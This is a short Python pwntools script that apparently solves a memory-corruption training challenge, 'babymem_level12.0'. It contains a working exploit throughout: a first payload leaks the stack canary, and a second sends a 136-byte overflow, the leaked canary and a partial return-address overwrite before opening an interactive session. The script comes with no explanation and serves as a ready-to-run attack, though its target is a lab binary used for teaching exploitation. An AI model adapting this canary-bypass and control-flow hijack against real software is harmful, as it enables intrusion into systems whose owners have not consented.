from pwn import *
from pwn import p64

context.log_level = "error"

pros = process("../Binaries/babymem_level12.0")

payload = b"154\n" + b"REPEAT"

pros.sendline(payload)
pros.recvlines(146)
pros.recv(26)
canary = int(pros.recv(18), 16)

junk = b"A" * 136
payload = b"154\n" + junk + p64(canary) + b"B" * 8 + b"\x86\x23"

pros.sendline(payload)
pros.interactive()
